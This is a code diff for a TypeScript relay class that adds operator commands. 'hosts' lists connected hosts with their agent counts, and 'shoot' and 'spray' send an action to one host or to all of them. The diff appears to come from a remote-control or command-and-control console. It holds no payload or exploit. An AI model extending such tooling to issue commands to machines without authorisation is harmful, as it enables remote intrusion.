@@ -5,7 +5,7 @@ import { Socket } from 'net';
 import { spawn, spawnSync, SpawnOptionsWithoutStdio, ChildProcessWithoutNullStreams } from 'child_process';
 import { TLSSocket, PeerCertificate } from 'tls';
 import { WebSocket } from 'ws';
-import { IF11Connectable } from './types';
+import { IF11Connectable, IF11Host } from './types';
 import { F11Base } from './Base';
 import { F11Controller } from './Controller';
 
@@ -277,6 +277,60 @@ export class F11Relay extends F11Base implements IF11Connectable {
         this.relay.reset();
       }
     }
+  }
+
+  public onHost(method: string, ...args: string[]) {
+    const { hosts } = this.ctl;
+    const lines = [...args].concat(['F11Host List:'.underline]);
+
+    this.log.info(`Running host method: '${method}'`, args);
+
+    if (hosts.length) {
+      if (args.length > 1) {
+        const [ index, ...rest ] = args;
+        const action = rest.join(' ');
+
+        if (hosts[index] && typeof hosts[index][method] === 'function') {
+          hosts[index][method](action);
+          this.send(`Host ${method} [${index}]: '${action}'`);
+        } else {
+          this.send(`Missing/invalid host index: ${index}`.yellow);
+        }
+      } else {
+        this.send(`Usage: shoot [index] [...action]`.yellow);
+      }
+    } else {
+      this.send(`No hosts to shoot!`.yellow);
+    }
+  }
+
+  public shoot(...args: string[]) {
+    this.onHost('sendAny', ...args);
+  }
+
+  public spray(...args: string[]) {
+    this.onHost('sendAll', ...args);
+  }
+
+  public hosts(...args: string[]) {
+    const { hosts } = this.ctl;
+    const lines = [...args].concat(['F11Host List:'.underline]);
+
+    this.log.info(`Running host list command...`);
+
+    if (hosts.length) {
+      this.ctl.hosts.forEach((host, index) => {
+        const cols = [ host.address.green, host.hostname.blue, `${host.agents.length} agent(s)`.cyan ];
+        lines.push(`\t[${index}]`.yellow + ' ' + cols.map(c => c.padEnd(28, ' ').padStart(30, ' ')).join(' | '));
+      });
+
+      lines.push('');
+      lines.push(`Select an available host with: "use [0-${this.ctl.hosts.length - 1}]"`.italic);
+    } else {
+      lines.push(`\tNo available hosts`);
+    }
+
+    this.send(lines.join(`\n`));
   }
 
   public ls(...args: string[]) {
